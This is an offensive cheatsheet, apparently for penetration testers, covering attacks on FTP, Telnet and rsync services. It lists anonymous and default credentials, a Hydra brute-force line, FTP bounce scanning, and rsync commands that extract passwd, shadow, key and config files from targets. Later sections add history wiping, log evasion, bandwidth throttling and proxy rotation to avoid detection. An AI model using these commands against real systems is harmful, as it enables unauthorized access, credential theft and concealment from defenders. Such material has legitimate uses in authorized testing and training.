# FTP, Telnet, and rsync Cheatsheet

## FTP (File Transfer Protocol)

### Service Discovery & Banner Grabbing

| Command | Description |
|---------|-------------|
| `ftp <target_ip>` | Basic FTP connection |
| `echo "QUIT" \| nc <target_ip> 21` | Netcat banner grab |
| `nmap -sV -p 21 <target_ip>` | Nmap service detection |
| `nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 <target_ip>` | Nmap with FTP-specific scripts |

### Anonymous Access

| Username | Password |
|----------|----------|
| `anonymous` | `anonymous@example.com` |
| `anonymous` | (blank) |

### Common FTP Directories

| Directory | Intelligence Value |
|-----------|-------------------|
| `/pub` | Public files, software, documentation, data dumps |
| `/incoming` | Upload directory with user-submitted files |
| `/outgoing` | Distribution directory for internal files |
| `/backup` | System backups (passwords, configurations) |
| `/logs` | Log files revealing system activity |
| `/home` | User directories if misconfigured |
| `/etc` | Configuration files in poorly configured systems |

### FTP Bounce Scanning

| Command | Description |
|---------|-------------|
| `nmap -b anonymous:anonymous@<ftp_server> <internal_target>` | Use FTP server as proxy for port scanning |

### Data Exfiltration

| Command | Description |
|---------|-------------|
| `wget -r ftp://anonymous:anonymous@<target_ip>` | Bulk recursive download |
| `lftp ftp://anonymous:anonymous@<target_ip>` | Advanced FTP client |
| `mirror <remote_path> <local_path>` | Mirror directory (within lftp) |

### High-Value File Types

| Pattern | Description |
|---------|-------------|
| `*.conf`, `*.cfg`, `*.ini` | Configuration files |
| `*.bak`, `*.backup`, `*.old` | Backup files |
| `*.sql`, `*.db` | Database dumps |
| `*.log` | Log files |
| `*.txt`, `*.doc`, `*.pdf` | Documentation |
| `*.sh`, `*.py`, `*.php` | Scripts and source code |

## Telnet

### Service Discovery

| Command | Description |
|---------|-------------|
| `telnet <target_ip> 23` | Basic Telnet connection |
| `nmap -sV -p 23 <target_ip>` | Nmap service detection |
| `nmap --script telnet-brute,telnet-encryption,telnet-ntlm-info -p 23 <target_ip>` | Nmap with Telnet-specific scripts |

### Common Alternative Ports

| Port | Typical Use |
|------|-------------|
| 23 | Standard Telnet |
| 2223 | Alternative Telnet |
| 2322 | SSH alternative/Telnet |
| 2323 | Alternative Telnet |
| 8023 | Secure Telnet |
| 9999 | Alternative Telnet |
| 10001 | Alternative Telnet |

### Port Scanning Command

| Command | Description |
|---------|-------------|
| `nmap -p 23,2223,2322,2323,8023,9999,10001 <target_ip>` | Scan common Telnet ports |
| `nmap -sV -p 23,2223,2322,2323,8023,9999,10001 <target_ip>` | Service detection on multiple ports |

### Default Credentials

| Username | Password |
|----------|----------|
| `admin` | `admin` |
| `admin` | `password` |
| `admin` | (blank) |
| `root` | `root` |
| `root` | `password` |
| `guest` | `guest` |
| `user` | `user` |
| `cisco` | `cisco` |
| `enable` | `enable` |

### Brute Force Tools

| Command | Description |
|---------|-------------|
| `hydra -L usernames.txt -P passwords.txt telnet://<target_ip> -vV -t4 -I` | Hydra brute force |

### Initial Reconnaissance Commands

| Command | Description |
|---------|-------------|
| `uname -a` | System information, kernel version, architecture |
| `whoami && id` | Current user and privileges |
| `ifconfig \|\| ip a` | Network interfaces and IP addresses |

### Session Enumeration

| Command | Description |
|---------|-------------|
| `who` | Currently logged-in users |
| `w` | System users and their processes |
| `last` | Recent login/logout history |
| `users` | List of current usernames |
| `tty` | Current terminal name |
| `ps -t $(tty)` | Processes running on current terminal |

### Session Cleanup

| Command | Description |
|---------|-------------|
| `history -c` | Clear command history |
| `unset HISTFILE` | Disable history logging |
| `rm ~/.bash_history 2>/dev/null` | Remove history file |
| `unalias ls 2>/dev/null` | Remove command aliases |
| `cd /` | Change to root directory |

## Rsync

### Service Discovery

| Command | Description |
|---------|-------------|
| `rsync <target_ip>::` | Basic Rsync service test and module listing |
| `rsync --list-only <target_ip>` | Explicit module listing |
| `nmap -p 873,8873,9873 <target_ip>` | Scan common Rsync ports |
| `nmap -sV -p 873 <target_ip>` | Service detection |

### Module Enumeration

| Command | Description |
|---------|-------------|
| `rsync -av --list-only <target_ip>::<module_name>` | Detailed module information |
| `for module in backup home www data etc opt var; do echo "Testing module: $module"; rsync --list-only <target_ip>::$module 2>/dev/null; done` | Test common modules |

### File Type Hunting

| Command | Description |
|---------|-------------|
| `rsync -avz --list-only <target_ip>::<module>/ \| grep -E '\.(conf\|cfg\|ini\|bak\|sql\|log)$'` | Search for specific valuable file types |

### Data Extraction

| Command | Description |
|---------|-------------|
| `rsync -avz <target_ip>::<module>/ ./rsync_dump/` | Complete module mirror |
| `rsync -avz --include="*.conf" --include="*.cfg" --exclude="*" <target_ip>::<module>/ ./configs/` | Selective file extraction |
| `rsync -avz --bwlimit=100 <target_ip>::<module>/ ./slow_dump/` | Bandwidth-limited extraction |

### High-Value File Extraction

```bash
rsync -avz --include="*passwd*" --include="*shadow*" --include="*config*" \
--include="*.conf" --include="*.cfg" --include="*.ini" \
--include="*.bak" --include="*.sql" --include="*.key" \
--include="*.pem" --exclude="*" <target_ip>::<module>/ ./intel/
```

### Write Access Testing

| Command | Description |
|---------|-------------|
| `echo "rsync_test_$(date)" > test_file.txt` | Create test file |
| `rsync -avz test_file.txt <target_ip>::<module>` | Attempt upload |
| `rsync --list-only <target_ip>::<module>/ \| grep test_file.txt` | Verify upload |

## Detection Evasion & Operational Security

### Traffic Obfuscation

| Technique | Command Example |
|-----------|-----------------|
| Bandwidth limiting | `rsync -avz --bwlimit=50 --delay-updates <target>::<module>/ ./stealth_dump` |
| Randomized delays | `sleep $((RANDOM % 300 + 60))` (1-6 minute random delay) |

### Log Evasion

| Protocol | Evasion Technique |
|----------|-------------------|
| FTP | Use realistic email addresses for anonymous login |
| Telnet | Clear command history before disconnect |
| Rsync | Use bandwidth limiting to appear as legitimate sync |

### Common Log Entries to Avoid

| Protocol | Suspicious Pattern | Mitigation |
|----------|-------------------|------------|
| FTP | Multiple failed login attempts | Use valid credentials or space out attempts |
| FTP | Bulk file downloads | Limit bandwidth and randomize timing |
| Telnet | Administrative commands from unknown IPs | Use VPN/proxy rotation |
| Telnet | History of reconnaissance commands | Clear history before disconnect |
| Rsync | Large data transfers | Use bandwidth limiting |
| Rsync | Access to sensitive modules | Access during high-traffic periods |

## Common Service Implementations

### FTP Implementations

| Implementation | Typical Banner |
|----------------|----------------|
| vsftpd | `220 (vsFTPd 3.0.3)` |
| ProFTPD | `220 ProFTPD Server` |
| Pure-FTPd | `220 Pure-FTPd Server` |
| FileZilla Server | `220-FileZilla Server` |
| Microsoft IIS | `220 Microsoft FTP Service` |

### Telnet Implementations

| Implementation | Typical Identifier |
|----------------|-------------------|
| Linux telnetd | `Debian GNU/Linux` or similar OS banner |
| Windows Telnet Server | `Welcome to Microsoft Telnet Server` |
| Cisco IOS | `User Access Verification` |
| BusyBox | `Welcome to ... (built-in shell)` |

Reach out: https://linktr.ee/january1073
